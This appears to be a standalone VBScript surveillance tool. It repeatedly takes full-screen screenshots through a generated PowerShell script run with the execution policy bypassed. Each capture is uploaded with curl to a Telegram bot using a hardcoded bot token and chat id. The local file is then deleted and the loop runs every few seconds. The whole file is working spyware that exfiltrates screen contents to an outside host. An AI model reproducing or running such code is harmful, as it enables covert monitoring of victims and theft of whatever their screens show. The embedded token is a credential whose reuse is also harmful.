' Declare necessary objects
Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

' Telegram Bot Variables
telegram_token = "7903894927:AAFx6hah2_lsxnesnYQLV474drvqDhqUE58"
chat_id = "7975364416"

' Define the directory where the script and screenshots will be saved
script_directory = objFSO.GetParentFolderName(WScript.ScriptFullName)
screenshotFilePath = script_directory & "\screenshot.png"

' Create a simplified PowerShell script that uses a different method for taking screenshots
powershell_script = "$ScreenshotPath = '" & screenshotFilePath & "'" & vbCrLf & _
    "Add-Type -AssemblyName System.Windows.Forms,System.Drawing" & vbCrLf & _
    "$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen" & vbCrLf & _
    "$Width = $Screen.Width" & vbCrLf & _
    "$Height = $Screen.Height" & vbCrLf & _
    "$Left = $Screen.Left" & vbCrLf & _
    "$Top = $Screen.Top" & vbCrLf & _
    "$Bitmap = New-Object System.Drawing.Bitmap $Width, $Height" & vbCrLf & _
    "$Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)" & vbCrLf & _
    "$Graphics.CopyFromScreen($Left, $Top, 0, 0, $Bitmap.Size)" & vbCrLf & _
    "$Bitmap.Save($ScreenshotPath)" & vbCrLf & _
    "$Graphics.Dispose()" & vbCrLf & _
    "$Bitmap.Dispose()"

' Define the file path for the PowerShell script
temp_ps_file = script_directory & "\temp_screenshot.ps1"

' Save the PowerShell script to a temporary file
Set objFile = objFSO.CreateTextFile(temp_ps_file, True)
objFile.WriteLine powershell_script
objFile.Close

Do
    ' Execute PowerShell script with visibility and wait for completion
    objShell.Run "powershell -ExecutionPolicy Bypass -File """ & temp_ps_file & """", 1, True

    ' Wait for the screenshot to be saved
    WScript.Sleep 3000

    ' Check if the screenshot file exists
    If objFSO.FileExists(screenshotFilePath) Then
        ' Send the screenshot to Telegram using curl instead of XMLHTTP
        curlCommand = "curl -F ""chat_id=" & chat_id & """ -F ""photo=@" & screenshotFilePath & """ https://api.telegram.org/bot" & telegram_token & "/sendPhoto"
        objShell.Run "cmd /c " & curlCommand, 0, True

        ' Wait for Telegram to process the request
        WScript.Sleep 2000

        ' Delete the screenshot file after sending it
        If objFSO.FileExists(screenshotFilePath) Then
            objFSO.DeleteFile screenshotFilePath
        End If

    Else
        MsgBox "Screenshot file was not created. Please check your script."
    End If

    ' Wait for 5 seconds before taking another screenshot
    WScript.Sleep 5000
Loop
